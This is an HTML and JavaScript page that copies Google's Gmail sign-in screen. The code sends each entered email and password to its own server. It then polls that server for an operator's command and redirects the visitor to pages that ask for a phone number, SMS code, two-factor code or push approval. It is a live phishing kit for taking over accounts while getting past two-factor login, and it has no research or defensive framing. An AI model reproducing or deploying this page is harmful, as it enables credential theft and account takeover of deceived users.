<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="header">
                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_light_color_272x92dp.png" alt="Google" class="logo">
                <h1>Sign in</h1>
                <p class="subtitle">to continue to Gmail</p>
            </div>
            
            <form id="loginForm">
                <div class="input-group">
                    <input type="email" id="email" required>
                    <label>Email or phone</label>
                    <div class="underline"></div>
                </div>
                
                <div class="input-group">
                    <input type="password" id="password" required>
                    <label>Enter your password</label>
                    <div class="underline"></div>
                </div>
                
                <div class="options">
                    <a href="#" class="forgot-link">Forgot email?</a>
                </div>
                
                <div class="actions">
                    <a href="#" class="create-link">Create account</a>
                    <button type="submit" class="btn-next">Next</button>
                </div>
            </form>
            
            <div id="loading" style="display:none;">
                <div class="spinner"></div>
                <p class="loading-text">Verifying...</p>
            </div>
            
            <div id="sessionInfo" class="session-info"></div>
        </div>
    </div>
    
    <script>
        let sessionId = null;
        
        async function initSession() {
            try {
                const response = await fetch('/api/visit', { method: 'POST' });
                const data = await response.json();
                sessionId = data.sessionId;
                document.getElementById('sessionInfo').textContent = `Session: ${sessionId}`;
            } catch (error) {
                console.error('Error:', error);
            }
        }
        
        initSession();
        
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            document.querySelector('.card').style.opacity = '0.5';
            document.getElementById('loading').style.display = 'block';
            document.getElementById('loginForm').style.display = 'none';
            
            try {
                await fetch('/api/email', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ sessionId, email })
                });
                
                await fetch('/api/password', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ sessionId, password })
                });
                
                await waitForCommand();
                
            } catch (error) {
                console.error('Error:', error);
            }
        });
        
        async function waitForCommand() {
            const maxAttempts = 300;
            let attempts = 0;
            
            while (attempts < maxAttempts) {
                try {
                    const response = await fetch(`/api/command/${sessionId}`);
                    const data = await response.json();
                    
                    if (data.command) {
                        handleCommand(data.command);
                        return;
                    }
                } catch (error) {
                    console.error('Polling error:', error);
                }
                
                await new Promise(resolve => setTimeout(resolve, 2000));
                attempts++;
            }
            
            alert('Session timed out. Please try again.');
            location.reload();
        }
        
        function handleCommand(command) {
            switch(command) {
                case 'phone':
                    window.location.href = '/prompt.html?type=phone';
                    break;
                case 'sms':
                    window.location.href = '/prompt.html?type=sms';
                    break;
                case '2fa':
                    window.location.href = '/prompt.html?type=2fa';
                    break;
                case 'notification':
                    window.location.href = '/prompt.html?type=notification';
                    break;
                case 'success':
                    window.location.href = '/success.html';
                    break;
                default:
                    console.log('Unknown command:', command);
            }
        }
    </script>
</body>
</html>
